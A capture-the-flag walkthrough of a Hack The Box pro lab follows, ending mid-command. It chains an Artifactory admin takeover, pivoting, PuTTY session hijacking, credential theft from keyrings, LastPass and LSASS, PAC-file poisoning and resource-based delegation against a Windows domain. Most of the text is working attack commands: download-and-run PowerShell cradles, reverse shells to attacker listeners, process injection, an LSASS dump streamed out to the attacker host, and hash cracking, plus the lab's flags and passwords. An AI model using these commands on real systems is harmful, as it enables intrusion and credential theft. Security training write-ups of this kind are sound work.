# RPG Mini Pro Lab: 6-flag walkthrough

**Lab:** Hack The Box RPG (Advanced)  
**Result:** 6/6 flags

Roundsoft exposed Artifactory and Ignis, a Linux host running Rocket.Chat. The Artifactory recovery account let me reset the admin password. From its admin interface, a repository import pulled files from an internal development share. Those files exposed a Rocket.Chat token and an SSH key for Ignis.

Ignis provided a route into the internal network. On Lux, I hijacked an active PuTTY session to get root on Ignis, then used Ruby's keyring to obtain workstation credentials. WMI took me to Gelus; LastPass, WinSCP, and a writable proxy configuration led to more domain credentials. Finally, Jops's rights on Shinra enabled resource-based constrained delegation and a SYSTEM shell. The last flag was EFS encrypted, so it had to be read as the account holding the decryption key.

## Address and credential map

| Host | External IP | Internal IP | Role |
| --- | --- | --- | --- |
| Ignis | 10.13.38.18 | 192.168.125.135 | Linux, SSH, Rocket.Chat |
| Artifactory | 10.13.38.19 | — | IIS and JFrog 6.13.1 |
| Lux | — | 192.168.125.129 | Windows workstation |
| Gelus | — | 192.168.125.88 | Windows, PAC site, LastPass |
| Shinra | — | 192.168.125.128 | ROUNDSOFT.LOCAL domain controller |

### Flag index

| Objective | Flag | Location |
| --- | --- | --- |
| Would you like to play a game? | RPG{c0waBuNg@!_Ssrf1n_iNtO_tHe_1nt3rn@l!} | Imported Artifactory repository |
| Sword and mind | RPG{h1j@ckin_lyk_@_pir@t3} | Ignis root shell |
| One’s act, one’s profit | RPG{n0thing_1s_h1dd3n_fr0m_r00t!} | Ruby keyring |
| The source of power | RPG{L3v31iNg_uP_2_t3h_b0$$_m0d3} | LastPass vault |
| Wake from death and turn to life | RPG{l3ave_my_hash3s_al0ne!} | Gelus |
| Collapse of the empire | RPG{WhY_w0rK_h@rD_Wh3N_U_c@N_d3l3g@7e?} | Shinra EFS file |

## 1. Artifactory: external entry and the first flag

From Kali:

~~~bash
cd /home/zendeni/RPG
nmap -Pn -sC -sV -p 22,80,3000 10.13.38.18 -oN ignis.nmap
nmap -Pn -sC -sV -p 80,8081 10.13.38.19 -oN artifactory.nmap
~~~

Relevant output:

~~~text
10.13.38.18: 22/tcp OpenSSH 7.6p1; 80/tcp Apache 2.4.29;
             3000/tcp Meteor-style HTTP (Rocket.Chat)
10.13.38.19: 80/tcp Microsoft IIS 10.0; 8081/tcp Tomcat 8.5.41
~~~

Artifactory identified itself as version 6.13.1. The recovery account `access-admin` used `Password12` and could authenticate to the Access API, but an API response said `UI Access is Disabled For This User`.

Send an HTTP `PATCH` to the existing `admin` user resource with a JSON body containing a new password. A `200` response meant the API accepted that update. The `access-admin` session did not become a UI administrator; the password change let us sign in separately as `admin`. The subsequent repository import was the action that reached the first flag.

~~~bash
# Choose a new password for the lab's admin account.
curl -sS -u 'access-admin:Password12' -X PATCH \
  'http://10.13.38.19:8081/artifactory/api/access/api/v1/users/admin' \
  -H 'Content-Type: application/json' \
  -d '{"password":"<chosen-lab-password>"}'
~~~

After signing in as `admin`, the System Logs, including `request.log`, exposed the `192.168.125.0/24` internal network. The repository import workflow accepted a Windows UNC path. The path was read by **Artifactory's server**, which could reach `\\192.168.125.129\development` on the private network; our browser did not need direct SMB access. The service copied that share's content into `FightingFantasy_Beta`, where the files became downloadable. This is why the API password update mattered: it opened an admin-only import operation that crossed from the external service into an internal SMB share.

~~~http
POST /artifactory/ui/artifactimport/repository HTTP/1.1
Host: 10.13.38.19:8081
Content-Type: application/json;charset=utf-8
Cookie: SESSION=<authenticated-session>

{"action":"repository","repository":"FightingFantasy_Beta","path":"\\\\192.168.125.129\\development","excludeMetadata":false,"verbose":false}
~~~

Response:

~~~json
{"info":"Successfully imported '\\\\192.168.125.129\\development' into 'FightingFantasy_Beta'."}
~~~

The imported repository contained the first flag and the files `Feedbacks.exe`, `key.txt`, and `README.txt`.

**Flag:** `RPG{c0waBuNg@!_Ssrf1n_iNtO_tHe_1nt3rn@l!}`

~~~bash
file Feedbacks.exe
cat README.txt
wc -c key.txt
~~~

~~~text
Feedbacks.exe: PE32 executable for MS Windows 6.00 (console), Intel i386 Mono/.Net assembly, 3 sections
Team,
I put together this quick program to collect developer feedback messages in real time ...
I sent a separate email with the encrypted API key ...
Development Operations
144 key.txt
~~~

## 2. Rocket.Chat: decrypt the token, find beta_user's key

The .NET executable decrypts the content of `key.txt` and hands it to a Rocket.Chat API routine. Mono disassembly gave both the hard-coded user ID and the call we could change to print the decrypted token:

~~~bash
strings -el Feedbacks.exe | grep -Ei 'rocket|feedback|aes|decrypt|auth|channels|https?'
monodis Feedbacks.exe > Feedbacks.il
rg -n -C 6 'DecryptString|GetFeedback|X-Auth-Token|X-User-Id' Feedbacks.il
~~~

Output:

~~~text
http://192.168.125.135:3000/api/v1/channels.messages?roomId=eoxPkMvnBNCB8q9n8
X-Auth-Token
X-User-Id
IL_0050: ldstr "HTpmn63zyESXXsGZa"
~~~

The `X-User-Id` value was embedded directly in `GetFeedback`. It was not derived from the token. We replaced the one IL call to `GetFeedback` with a console print and assembled a modified executable:

~~~bash
python3 - <<'PY'
from pathlib import Path
src = Path('Feedbacks.il').read_text()
old = 'call void class RocketChatLogger.Program::GetFeedback(string)'
new = 'call void class [mscorlib]System.Console::WriteLine(string)'
assert src.count(old) == 1
Path('Feedbacks-print.il').write_text(src.replace(old, new))
PY
TERM=dumb ilasm Feedbacks-print.il /exe /output=Feedbacks-print.exe
TERM=dumb mono Feedbacks-print.exe "$(tr -d '\r\n' < key.txt)"
~~~

Output:

~~~text
Operation completed successfully
_bXOx5rjOpTOE3hEfJNTzjAdTWEFas2um7xNH13ylZL
~~~

The first `ilasm` attempt had failed in Mono terminal initialization with `File must be smaller than 4K`; setting `TERM=dumb` fixed that local tooling problem.

~~~bash
RC='http://10.13.38.18:3000'
TOKEN='_bXOx5rjOpTOE3hEfJNTzjAdTWEFas2um7xNH13ylZL'
RC_USER_ID='HTpmn63zyESXXsGZa'
curl -sS -H "X-Auth-Token: $TOKEN" -H "X-User-Id: $RC_USER_ID" \
  "$RC/api/v1/channels.list" |
  tee channels.json | jq -r '.channels[] | [.name, ._id] | @tsv'
curl -sS -H "X-Auth-Token: $TOKEN" -H "X-User-Id: $RC_USER_ID" \
  "$RC/api/v1/groups.list" |
  tee groups.json | jq -r '.groups[] | [.name, ._id] | @tsv'
~~~

Relevant rooms:

~~~text
development_requests    eoxPkMvnBNCB8q9n8
hr_announcements         sPPBSQskQ4afSmMeJ
developers_chat          X5xn88ZMRjpog4A9h
onboarding_information   2iHYAhwtJjbyj4a6N
~~~

The onboarding room's original post contained `Welcome_roundsoft123`. Its `credentials issue` discussion (`drid=b5JuYWTXHnXMbviYa`) corrected the password:

~~~bash
curl -sS -H "X-Auth-Token: $TOKEN" -H "X-User-Id: $RC_USER_ID" \
  "$RC/api/v1/groups.messages?roomId=b5JuYWTXHnXMbviYa&count=100" |
  jq -r '.messages[] | [.u.username, .msg] | @tsv'
~~~

~~~text
roundsoft_hr  ... we adopted a new password format for the default login.
              Please use 'Welcome_roundsoft2019!'
janderson     that worked
~~~

The `tnomura` ↔ `dev-admin` direct message revealed the Linux username `beta_user`. In `developers_chat`, dev-admin attached a private SSH key (file ID `crBDvzQkhN77KLrxz`) for the development network:

~~~bash
curl -sS -H "X-Auth-Token: $TOKEN" -H "X-User-Id: $RC_USER_ID" \
  "$RC/api/v1/im.list" |
  jq '.ims[] | select(.usernames | index("dev-admin")) | {_id, usernames}'
curl -sS -H "X-Auth-Token: $TOKEN" -H "X-User-Id: $RC_USER_ID" \
  "$RC/api/v1/im.messages?roomId=HTpmn63zyESXXsGZackBN4uDvbKecTqoBS&count=100" |
  jq -r '.messages[] | [.u.username, .msg] | @tsv'
curl -sS -H "X-Auth-Token: $TOKEN" -H "X-User-Id: $RC_USER_ID" \
  "$RC/api/v1/groups.messages?roomId=X5xn88ZMRjpog4A9h&count=100" |
  jq '.messages[] | select(.file != null) | {msg, file: {id: .file._id, name: .file.name}}'
~~~

Dev-admin confirmed `beta_user` as the Linux login. The developers room supplied the SSH key as an attachment named `key.txt` (file ID `crBDvzQkhN77KLrxz`).

~~~bash
curl -fLsS -H "X-Auth-Token: $TOKEN" -H "X-User-Id: $RC_USER_ID" \
  "$RC/ufs/GridFS:Uploads/crBDvzQkhN77KLrxz/key.txt" -o beta_user.key
chmod 600 beta_user.key
head -n 1 beta_user.key
ssh -o IdentitiesOnly=yes -i ./beta_user.key beta_user@10.13.38.18
~~~

Output:

~~~text
-----BEGIN RSA PRIVATE KEY-----
Welcome to Ubuntu 18.04.6 LTS
beta_user@Ignis:~$ hostname; id; ip -br addr
Ignis
uid=1002(beta_user) gid=1002(beta_user) groups=1002(beta_user)
ens160 UP 10.13.38.18/24
ens192 UP 192.168.125.135/24
~~~

## 3. Internal pivot and PuTTY hijack

Ignis had an interface on each subnet. A sweep of `192.168.125.0/24` found four hosts, including Ignis and three more internal machines. Forward the subnet through its SSH connection:

~~~bash
# On Ignis
seq 1 254 | xargs -P 32 -I% sh -c \
  'ping -c1 -W1 192.168.125.% >/dev/null 2>&1 && echo 192.168.125.%' |
  sort -V
~~~

~~~text
192.168.125.88
192.168.125.128
192.168.125.129
192.168.125.135
~~~

~~~bash
# On Kali, leave running in its own terminal
sshuttle -D \
  -e 'ssh -o IdentitiesOnly=yes -i /home/zendeni/RPG/beta_user.key' \
  -r beta_user@10.13.38.18 192.168.125.0/24

nxc smb 192.168.125.88 192.168.125.128 192.168.125.129 \
  -u janderson -p 'Welcome_roundsoft2019!'
nxc winrm 192.168.125.88 192.168.125.128 192.168.125.129 \
  -u janderson -p 'Welcome_roundsoft2019!'
~~~

Output:

~~~text
SHINRA 192.168.125.128 SMB   [+] Roundsoft.local\janderson
LUX    192.168.125.129 SMB   [+] Roundsoft.local\janderson
LUX    192.168.125.129 WINRM [+] Roundsoft.local\janderson (Pwn3d!)
GELUS  192.168.125.88  WINRM [-] Roundsoft.local\janderson
~~~

On Lux, `janderson` had an interactive PuTTY 0.70 process connected to Ignis SSH. Ignis showed root logged in from Lux. This suggested an active root SSH session in that PuTTY process.

~~~powershell
# Janderson's Evil-WinRM session on Lux
hostname
whoami
Get-Process putty -ErrorAction SilentlyContinue | Select-Object Id,SessionId,Path
netstat -ano | findstr 192.168.125.135
(Get-Item 'C:\Program Files\Putty\putty.exe').VersionInfo |
  Select-Object FileVersion,ProductVersion
~~~

~~~text
Lux
roundsoft\janderson
putty.exe SessionId=1, C:\Program Files\Putty\putty.exe
192.168.125.129:49721  192.168.125.135:22  ESTABLISHED
Release 0.70
~~~

~~~bash
ssh -i ./beta_user.key beta_user@10.13.38.18 'who'
~~~

~~~text
root pts/0 ... (192.168.125.129)
~~~

The PuttyRider 0.1 DLL used signatures for an older PuTTY. We replaced both occurrences of each signature with equal-length PuTTY 0.70 signatures; the patched DLL stayed 80,896 bytes.

~~~bash
curl -fL \
  'https://github.com/seastorm/PuttyRider/releases/download/0.1/PuttyRider-bin.zip' \
  -o PuttyRider-bin.zip
unzip -o PuttyRider-bin.zip -d puttyrider
python3 - <<'PY'
from pathlib import Path
p = Path('puttyrider/PuttyRider.dll')
b = p.read_bytes()
for old, new in [
    ('515355568b742414578b7c242033ed3bfd896c2410',
     '5553575683ec0c8b7424208b7c2428833e00751768'),
    ('56ff7424148b74240cff7424148d466050e8',
     '568b7424088d4660ff742414ff74241450e8'),
]:
    x, y = bytes.fromhex(old), bytes.fromhex(new)
    assert len(x) == len(y) and b.count(x) == 2
    b = b.replace(x, y)
p.write_bytes(b)
print('Patched {} ({} bytes)'.format(p, len(b)))
PY
~~~

Each old signature occurred twice. The patched `PuttyRider.dll` remained 80,896 bytes.

The WinRM session was separate from the interactive desktop running PuTTY. Load `Invoke-PSInject`, choose a Session 1 `RuntimeBroker`, and inject a command that downloads `procat.ps1` from Ignis. Configure its final call as `procat -c 192.168.125.135 -p 4445 -e cmd.exe` to send a CMD shell back to Ignis. The connection was captured; the exact edit and trigger commands used in that attempt were not retained.

~~~powershell
# Janderson's Evil-WinRM session on Lux; script already imported.
Bypass-4MSI
Invoke-PSInject.ps1
$broker = Get-Process RuntimeBroker |
  Where-Object { $_.SessionId -eq 1 } |
  Select-Object -First 1
$code = 'IEX (New-Object Net.WebClient).DownloadString("http://192.168.125.135:8000/procat.ps1")'
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($code))
Invoke-PSInject -ProcId $broker.Id -PoshCode $encoded
~~~

The selected broker PID was 2516. A minimal file-write test produced `PSInject ran`, confirming that code ran in the interactive session. A first Powercat attempt listening on Lux at `0.0.0.0:4444` returned without a usable shell. Switching its final line to a reverse connection to Ignis on port 4445 gave us an interactive CMD in the right session.

~~~bash
ssh -tt -i ./beta_user.key beta_user@10.13.38.18 'nc -lvnp 4445'
~~~

~~~text
Connection from 192.168.125.129 ... received!
Microsoft Windows [Version 10.0.19045.4717]
C:\WINDOWS\system32>whoami
roundsoft\janderson
~~~

The PuTTY PID was short lived and changed during attempts. In the reverse CMD shell, look it up immediately before running the uploaded EXE and patched DLL:

~~~cmd
cd /d C:\Users\Janderson\Documents
powershell -NoProfile -Command "(Get-Process putty | Select-Object -First 1).Id"
.\PuttyRider.exe -p <current-PuTTY-PID> -d -r 192.168.125.135:4444
~~~

On Ignis, listen for PuttyRider:

~~~bash
ssh -tt -i ./beta_user.key beta_user@10.13.38.18 'nc -lvnp 4444'
~~~

Output:

~~~text
PuttyRider v0.1
[+] [3236] Client connected. Putty PID=3236
[+] [3236] Local endpoint: 192.168.125.129:49962
[+] [3236] Remote endpoint: 192.168.125.135:22
[-] [3236] You must first disconnect the Putty window (!discon command)
!discon
[+] [3236] Putty window disconnected
root@Ignis:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Ignis:~# cat /root/flag.txt
RPG{h1j@ckin_lyk_@_pir@t3}
~~~

The tool only forwarded keystrokes after `!discon`. The lab periodically restarted PuTTY, which explains changing PIDs and interrupted connections.

**Flag:** `RPG{h1j@ckin_lyk_@_pir@t3}`

## 4. Ruby's keyring, WMI to Gelus, and LastPass

Root on Ignis could inspect Ruby's active desktop session. Her GNOME Keyring process was running, and `mimipenguin.py` recovered the login password from memory:

~~~bash
ps -u ruby -o pid,cmd | grep -E 'gnome-keyring|dbus-daemon'
python3 /tmp/mimipenguin.py
~~~

~~~text
1972 /usr/bin/gnome-keyring-daemon --daemonize --login
[SYSTEM - GNOME]        ruby:N1xp@ssw0rd4Ruby
~~~

Run the Python `gnomekeyring` module in Ruby's session to unlock and list the non-default keyrings:

~~~bash
python - <<'PY'
import gnomekeyring as gk

for ring in ('Credentials', 'stuff'):
    gk.unlock_sync(ring, 'N1xp@ssw0rd4Ruby')
    print('\n[{}]'.format(ring))
    for item_id in gk.list_item_ids_sync(ring):
        item = gk.item_get_info_sync(ring, item_id)
        print('{} | {} | {}'.format(
            item_id, item.get_display_name(), item.get_secret()))
PY
~~~

Output:

~~~text
[Credentials]
4 | Wi-Fi       | itS_f@nt@st1c!
3 | Drive       | L1f3_1s_pl@st1c
2 | Workstation | I@mabArb13g1rl1n@barbi3w0rld

[stuff]
1 | Flag | RPG{n0thing_1s_h1dd3n_fr0m_r00t!}
~~~

**Flag:** `RPG{n0thing_1s_h1dd3n_fr0m_r00t!}`

The `Workstation` password worked for `roundsoft\rrodriguez` over WinRM on Lux:

~~~bash
evil-winrm -i 192.168.125.129 -u rrodriguez \
  -p 'I@mabArb13g1rl1n@barbi3w0rld'
~~~

In that session, the installed SolarWinds WmiMonitor and its per-user configuration pointed to Gelus:

~~~powershell
Get-ChildItem 'C:\Program Files (x86)\SolarWinds'
Get-ChildItem "$env:LOCALAPPDATA\SolarWinds" -Recurse -Filter user.config |
  ForEach-Object {
    $_.FullName
    Select-String -Path $_.FullName -Pattern 'HostAddr|Wmi_Credential_Name' -Context 0,1
  }
~~~

~~~text
C:\Program Files (x86)\SolarWinds\WmiMonitor
HostAddr             Gelus
Wmi_Credential_Name  Default
~~~

### The second hop

The first Windows shell was WinRM on **Lux** as `roundsoft\rrodriguez`; the target was **Gelus**. WMI's `Win32_Process.Create` creates a process on a remote host when the caller has the required WMI rights. SolarWinds pointed to Gelus as a monitoring target, and the WMI call below confirmed that Rrodriguez had those rights.

A normal WinRM logon does not put the user's plaintext password on Lux or automatically delegate Kerberos credentials to Gelus. An implicit network request from inside that shell can therefore fail on the **second hop**. Ruby's keyring gave us Rrodriguez's password, so we built an explicit `PSCredential` and passed it to WMI. Lux authenticated to Gelus anew using that credential, rather than trying to forward the WinRM logon token.

~~~powershell
$pass = ConvertTo-SecureString 'I@mabArb13g1rl1n@barbi3w0rld' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('roundsoft\rrodriguez', $pass)
Invoke-WmiMethod -ComputerName Gelus -Class Win32_Process -Name Create -ArgumentList 'notepad.exe' -Credential $cred |
  Select-Object ReturnValue,ProcessId
~~~

Output:

~~~text
ReturnValue ProcessId
----------- ---------
          0      4960
~~~

`ReturnValue 0` means WMI created the process on Gelus; `4960` was its PID. Repeat the same remote process creation with a PowerShell loader for the reverse CMD payload. The invocation below is an equivalent form of the working WMI technique; the resulting listener output was captured:

~~~powershell
# procat.ps1, hosted on Kali, ends with:
# procat -c <KALI_IP> -p 4444 -e cmd.exe
$launch = "IEX (New-Object Net.WebClient).DownloadString('http://<KALI_IP>:8002/procat.ps1')"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($launch))
Invoke-WmiMethod -ComputerName Gelus -Class Win32_Process -Name Create -ArgumentList "powershell.exe -NoProfile -EncodedCommand $encoded" -Credential $cred
~~~

~~~bash
nc -lvnp 4444
~~~

~~~text
connect to [<KALI_IP>] from (UNKNOWN) [10.13.38.19] 51604
Microsoft Windows [Version 10.0.17763.6054]
C:\Windows\system32>whoami
roundsoft\rrodriguez
C:\Windows\system32>hostname
GELUS
~~~

The listener displayed `10.13.38.19` as the connection source. The shell's `hostname` and `whoami` show that the process itself ran on Gelus as Rrodriguez.

On Gelus, Rrodriguez's Chrome profile contained the LastPass extension `hdokiejnpimakedhajhdlcegeplioahd`. Its SQLite store was a file named `1`:

~~~cmd
dir "C:\Users\rrodriguez\AppData\Local\Google\Chrome\User Data\Default\databases\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
~~~

~~~text
01/19/2020  10:01 PM            77,824 1
~~~

After copying it to Kali as `lastpass.sqlite`, we inspected it:

~~~bash
wc -c lastpass.sqlite
file lastpass.sqlite
sqlite3 lastpass.sqlite '.tables'
~~~

~~~text
77824 lastpass.sqlite
lastpass.sqlite: SQLite 3.x database
LastPassData  LastPassPreferences  LastPassSavedLogins
LastPassSavedLogins2  __WebKitDatabaseInfoTable__
~~~

`LastPassData` contained `key`, `otp`, `rsakey`, and `accts`; the account blob began with `iterations=100100` and `LPAV`. Open the copied database in an isolated Chrome/LastPass profile and unlock it with Ruby's `Drive` password, `L1f3_1s_pl@st1c`. The vault yielded the `ruby_adm` password `b3aut1fu1_lyk_@_g3m!` and the fourth flag.

**Flag:** `RPG{L3v31iNg_uP_2_t3h_b0$$_m0d3}`

## 5. Revive KReid, recover Yamano, and poison the PAC file

The `ruby_adm` password authenticated to LDAP on Shinra. KReid was a disabled former employee who still belonged to `ROUNDSOFT\Developers`, a group in Lux's local Administrators. `ruby_adm` had rights over selected former-employee objects; the LDAP query established KReid's account state and membership:

~~~bash
RUBY_ADM_PASS='b3aut1fu1_lyk_@_g3m!'
nxc ldap 192.168.125.128 -d roundsoft.local -u ruby_adm -p "$RUBY_ADM_PASS"
ldapsearch -LLL -x -H ldap://192.168.125.128 \
  -D 'ruby_adm@roundsoft.local' -w "$RUBY_ADM_PASS" \
  -b 'DC=roundsoft,DC=local' '(sAMAccountName=kreid)' \
  dn userAccountControl memberOf
~~~

~~~text
LDAP [+] roundsoft.local\ruby_adm:b3aut1fu1_lyk_@_g3m!
dn: CN=Kristy Reid,OU=ExEmployees,DC=Roundsoft,DC=local
memberOf: CN=Developers,CN=Users,DC=Roundsoft,DC=local
userAccountControl: 66050
~~~

Remove `ACCOUNTDISABLE` and reset KReid's password, then test WinRM on Lux. These are equivalent bloodyAD commands for the route; the successful KReid login was recorded, but the original account-edit commands were not:

~~~bash
bloodyAD -H 192.168.125.128 -d roundsoft.local \
  -u ruby_adm -p "$RUBY_ADM_PASS" \
  remove uac -f ACCOUNTDISABLE kreid
bloodyAD -H 192.168.125.128 -d roundsoft.local \
  -u ruby_adm -p "$RUBY_ADM_PASS" \
  set password kreid 'Pass12345!'
nxc winrm 192.168.125.129 -d roundsoft.local -u kreid -p 'Pass12345!'
~~~

~~~text
WINRM 192.168.125.129 LUX [+] Roundsoft.local\kreid:Pass12345! (Pwn3d!)
~~~

On Lux, KReid's local Administrator access allowed us to load Yamano's user registry hive and inspect his saved WinSCP session:

~~~powershell
reg load HKU\RPGYamano 'C:\Users\yamano\NTUSER.DAT'
reg query 'HKU\RPGYamano\Software\Martin Prikryl\WinSCP 2\Sessions' /s
reg unload HKU\RPGYamano
~~~

Output:

~~~text
HKEY_USERS\RPGYamano\Software\Martin Prikryl\WinSCP 2\Sessions\yamano@192.168.125.135
    HostName REG_SZ 192.168.125.135
    UserName REG_SZ yamano
    Password REG_SZ A35C7059DC0FAE8584253D313D32336D656E726D6A64726D6E69726D6F691D2E6B03350F033A1C32281C2F286D3F033E6F3D292825
~~~

WinSCP saved a reversibly encoded password tied to the username and host. Decode the captured hex, verify its `yamano` and `192.168.125.135` prefix, and extract the password. The Python below reproduces the recovered value:

~~~bash
python3 - <<'PY'
enc = 'A35C7059DC0FAE8584253D313D32336D656E726D6A64726D6E69726D6F691D2E6B03350F033A1C32281C2F286D3F033E6F3D292825'
user, host = 'yamano', '192.168.125.135'
d = bytes((~(v ^ 0xA3)) & 0xff for v in bytes.fromhex(enc))
assert d[:2] == bytes.fromhex('ff00')
length, skip = d[2], d[3]
combined = d[4 + skip:4 + skip + length].decode()
assert combined.startswith(user + host)
print(combined[len(user + host):])
PY
~~~

~~~text
Ar7_iS_f@nt@st1c_b3auty
~~~

A direct check showed the account had administrator-level access on Lux but **not** WinRM access to Gelus:

~~~bash
YAMANO_PASS='Ar7_iS_f@nt@st1c_b3auty'
nxc smb 192.168.125.88 192.168.125.129 \
  -d roundsoft.local -u yamano -p "$YAMANO_PASS"
nxc winrm 192.168.125.88 192.168.125.129 \
  -d roundsoft.local -u yamano -p "$YAMANO_PASS"
~~~

~~~text
LUX   SMB   [+] roundsoft.local\yamano (Pwn3d!)
GELUS SMB   [-] Connection Error: NETBIOS connection timed out
LUX   WINRM [+] roundsoft.local\yamano (Pwn3d!)
GELUS WINRM [-] roundsoft.local\yamano
~~~

Gelus was already accessible as Rrodriguez. Use Yamano's password locally **on Gelus** with `Invoke-RunasCs`. The resulting token included `ROUNDSOFT\Infra`, which could write the PAC file:

~~~powershell
$a = @{ Username='yamano'; Domain='roundsoft'; Password='Ar7_iS_f@nt@st1c_b3auty' }
Invoke-RunasCs @a -Command 'cmd /c whoami /groups'
~~~

~~~text
ROUNDSOFT\Infra       Group ... Enabled group
ROUNDSOFT\Developers  Group ... Enabled group
~~~

The PAC file `C:\inetpub\altroot\pac_testing\proxy.pac` initially returned `DIRECT`. It was readable in Yamano's context:

~~~powershell
Invoke-RunasCs @a -Command 'cmd /c type C:\inetpub\altroot\pac_testing\proxy.pac'
~~~

~~~javascript
function FindProxyForURL(url, host)
{
    // allow DIRECT for now, yamano to setup proxy server
    return "DIRECT";
}
~~~

`Start-Process -Credential` failed with Access denied. `Invoke-RunasCs -LogonType 8` fell back to interactive type 2, and a child PowerShell could not see the script saved at `C:\Windows\Temp\set-pac.ps1`. Pass a short script as `-EncodedCommand` instead. It saves the original PAC before changing the proxy target:

~~~powershell
$short = @'
$ErrorActionPreference='Stop'
$p='C:\inetpub\altroot\pac_testing\proxy.pac'
$b='C:\Users\yamano\Documents\proxy.pac.original'
if(!(Test-Path $b)){Copy-Item $p $b}
Set-Content -Encoding ASCII -Path $p -Value 'function FindProxyForURL(url,host){return "PROXY <KALI_IP>:3128";}'
Get-Content $p
'@
$e = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($short))
Invoke-RunasCs @a -Command "powershell.exe -NoProfile -EncodedCommand $e"
~~~

Output:

~~~text
function FindProxyForURL(url,host){return "PROXY <KALI_IP>:3128";}
~~~

The `FindProxyForURL` return value caused clients using the PAC to send web requests to our proxy on Kali. We ran Responder with its proxy-authentication feature:

~~~bash
responder -I tun0 -P
~~~

Output:

~~~text
[Proxy-Auth] NTLMv2 Client   : 10.13.38.19
[Proxy-Auth] NTLMv2 Username : ROUNDSOFT\AThompson
[Proxy-Auth] User-Agent      : Mozilla/5.0 ... Chrome/126.0.0.0 ...
~~~

Save the captured NetNTLMv2 line as `athompson.hash` for Hashcat. The hex digits were lowercased in the local copy; case does not affect the hash:

~~~text
ATHOMPSON::ROUNDSOFT:806903eec9e12baf:ccf8b187c3253a5545dc9ccbb3252e00:0101000000000000cce48775a952dd0106875a40af1f48eb0000000002000800480039004d00470001001e00570049004e002d004c004200570054005900470056005600500039005a0004001400480039004d0047002e004c004f00430041004c0003003400570049004e002d004c004200570054005900470056005600500039005a002e00480039004d0047002e004c004f00430041004c0005001400480039004d0047002e004c004f00430041004c0008003000300000000000000001000000002000003b40a105d5f2739b57b4008a91e4e6f19909c1ed65096d40acb22bcbb974e1040a0010000000000000000000000000000000000009002c0048005400540050002f00310030002e00310030002e00310034002e003200300031003a0033003100320038000000000000000000
~~~

Hashcat mode 5600 with `rockyou.txt` and `d3ad0ne.rule` recovered the password:

~~~bash
hashcat -m 5600 athompson.hash /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/d3ad0ne.rule
hashcat -m 5600 athompson.hash --show
~~~

~~~text
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Recovered........: 1/1
...:sshhiinnoobbii!!
~~~

`roundsoft\AThompson` had administrative WinRM access to Gelus, yielding the fifth flag:

~~~bash
evil-winrm -i 192.168.125.88 -u athompson -p 'sshhiinnoobbii!!'
~~~

~~~text
RPG{l3ave_my_hash3s_al0ne!}
~~~

**Flag:** `RPG{l3ave_my_hash3s_al0ne!}`

The original PAC was saved at `C:\Users\yamano\Documents\proxy.pac.original`. The run did not record a restoration.

## 6. Gelus LSASS → Jops → RBCD → SYSTEM on Shinra

In AThompson's administrator session on Gelus, `SeDebugPrivilege` was enabled. The old PowerSploit `Invoke-Mimikatz` loader failed with `AmbiguousMatchException` and `GetDelegateForFunctionPointer` overload errors. Dump LSASS with `comsvcs.dll,MiniDump` and parse it on Kali:

~~~powershell
whoami /priv | Select-String SeDebugPrivilege
$lsassPid = (Get-Process lsass).Id
cmd /c "rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump $lsassPid C:\Windows\Temp\gelus-lsass.dmp full"
Get-Item C:\Windows\Temp\gelus-lsass.dmp | Select-Object FullName,Length
Compress-Archive -Path C:\Windows\Temp\gelus-lsass.dmp -DestinationPath C:\Windows\Temp\gelus-lsass.zip -Force
Get-Item C:\Windows\Temp\gelus-lsass.zip | Select-Object Length
~~~

The LSASS PID varies by run. The dump and compressed archive had these sizes:

~~~text
SeDebugPrivilege  Debug programs  Enabled
C:\Windows\Temp\gelus-lsass.dmp  50195176
gelus-lsass.zip                  19683205
~~~

Evil-WinRM's first `download C:\Windows\Temp\gelus-lsass.zip ...` attempt misparsed the Windows path as relative to its current directory, stripping the separators. After `cd C:\Windows\Temp`, `download gelus-lsass.zip ...` found the file and began transferring, but failed at about 19% with `uninitialized constant WinRM::FS::FileManager::EstandardError`. That second error was in the transfer client; the archive itself was present and readable. We switched to a simple TCP stream.

~~~bash
# Kali receiver
cd /home/zendeni/RPG
nc -lvnp 8004 > gelus-lsass.zip
~~~

Use a PowerShell `TcpClient` on Gelus to stream the archive to the Kali listener. This command expresses the successful transfer as `FileStream.CopyTo`:

~~~powershell
$c = [Net.Sockets.TcpClient]::new('<KALI_IP>',8004)
$f = [IO.File]::OpenRead('C:\Windows\Temp\gelus-lsass.zip')
try { $f.CopyTo($c.GetStream()) }
finally { $f.Dispose(); $c.Dispose() }
~~~

~~~bash
stat -c '%s bytes' gelus-lsass.zip
sha256sum gelus-lsass.zip
unzip -o gelus-lsass.zip
pypykatz lsa minidump gelus-lsass.dmp > gelus-creds.txt
rg -n -i -C 8 'jops' gelus-creds.txt
~~~

Output:

~~~text
19683205 bytes
19666383a51a431930e45424d457faf59c89d5281243c3372166c6eee9877f44  gelus-lsass.zip
Archive: gelus-lsass.zip
  inflating: gelus-lsass.dmp
username jops
domainname ROUNDSOFT
    == MSV ==
    Username: jops
    NT: f7b8e6e5af23f06fdbb559d1888261fa
    == Kerberos ==
    AES256 Key: dbc38c7076f631f956211e118f2a7afa5c6a8bfb4f4f3d6031253ad8df47a3aa
~~~

The byte count, valid ZIP extraction, and successful minidump parse confirm that the transfer produced a usable copy. The SHA-256 shown above was calculated on Kali.

Jops's NT hash authenticated to LDAP. The lab's AD relationship showed Jops had `GenericWrite` on the SHINRA computer object. We used this to set the resource's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute:

~~~bash
JOPS_NT='f7b8e6e5af23f06fdbb559d1888261fa'
nxc ldap 192.168.125.128 -d roundsoft.local -u jops -H "$JOPS_NT"

impacket-addcomputer 'roundsoft.local/jops' \
  -dc-ip 192.168.125.128 -hashes ":$JOPS_NT" \
  -computer-name 'RPGPWN01$' -computer-pass 'RPGpwn_2026!'

impacket-rbcd 'roundsoft.local/jops' \
  -dc-ip 192.168.125.128 -hashes ":$JOPS_NT" \
  -delegate-from 'RPGPWN01$' -delegate-to 'SHINRA$' -action write

impacket-rbcd 'roundsoft.local/jops' \
